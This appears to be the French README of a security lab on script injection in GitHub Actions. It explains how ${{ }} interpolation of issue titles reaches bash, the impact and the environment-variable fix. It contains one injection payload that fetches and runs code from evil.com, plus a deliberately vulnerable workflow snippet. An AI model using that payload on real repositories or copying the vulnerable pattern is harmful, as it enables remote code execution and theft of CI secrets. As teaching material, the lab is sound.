# TP Sécurité — Script Injection dans GitHub Actions

## 🎯 Vulnérabilité étudiée

**Script Injection dans GitHub Actions**

| Référence | Valeur |
|-----------|--------|
| Standard | OWASP CI/CD Top 10 — **CICD-SEC-4** (Poisoned Pipeline Execution) |
| CWE | **CWE-94** — Improper Control of Generation of Code |
| Catégorie | Vulnérabilité **infrastructure / CI-CD** |
| Sévérité | Critique (RCE + exfiltration de secrets) |

## 📖 Description

GitHub Actions permet d'interpoler des expressions de la forme `${{ ... }}` directement dans les commandes shell d'un workflow. Quand ces expressions contiennent des **données contrôlées par un attaquant** (titre d'issue, nom de branche, message de commit, corps de pull request…), la substitution se fait **avant** que bash interprète la commande.

Conséquence : l'attaquant peut injecter du code shell arbitraire dans le runner CI.

## ⚙️ Mécanisme

Workflow vulnérable typique :
```yaml
run: echo "New issue: ${{ github.event.issue.title }}"
```

Étapes côté GitHub :
1. Un événement (issue, push…) déclenche le workflow
2. GitHub remplace `${{ github.event.issue.title }}` par la valeur brute
3. La commande finale est passée à bash
4. Bash parse — **trop tard pour échapper quoi que ce soit**

Avec un titre malveillant comme `"; curl evil.com | sh; #` :
- Le `"` ferme la chaîne du `echo`
- Le `;` enchaîne une nouvelle commande
- Le `#` commente la fin

→ **RCE dans le runner**.

## 💥 Impact

- Exécution de code arbitraire dans le runner GitHub
- Vol du `GITHUB_TOKEN` (permet de push, créer des releases, modifier le repo)
- Exfiltration de tous les secrets du repo (clés cloud, tokens API…)
- Compromission de la chaîne de build : injection de code malveillant dans les artefacts livrés
- Pivot possible vers les environnements de prod si le repo a des credentials de déploiement

## 🏗️ Pourquoi c'est une vulnérabilité d'infrastructure

Cette faille ne vit pas dans le code applicatif mais dans la **configuration du pipeline CI/CD lui-même**. Elle se détecte par :
- Analyse statique des fichiers de workflow (`.github/workflows/`)
- Outils dédiés DevSecOps : `actionlint`, `zizmor`, `semgrep`
- Audit de la configuration de l'infrastructure de build

Le correctif est purement infra : il ne modifie pas la logique métier, seulement la **manière dont le pipeline manipule les entrées**.

## 📂 Structure du repo

| Fichier | Rôle |
|---------|------|
| `.github/workflows/vulnerable.yml` | Workflow vulnérable (démonstration) |
| `.github/workflows/security.yml` | Pipeline de test sécurité (SAST workflows) |
| `.github/workflows/fixed.yml` | Workflow corrigé |
| `RAPPORT.md` | Démonstration de l'attaque + analyse |

## ✅ Correctif appliqué

Passage de la donnée utilisateur via une **variable d'environnement** plutôt que par interpolation directe :

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "New issue: $TITLE"
```

Bash lit alors la valeur comme **donnée** (variable shell), jamais comme **code**. C'est l'équivalent infra des requêtes paramétrées contre les injections SQL.
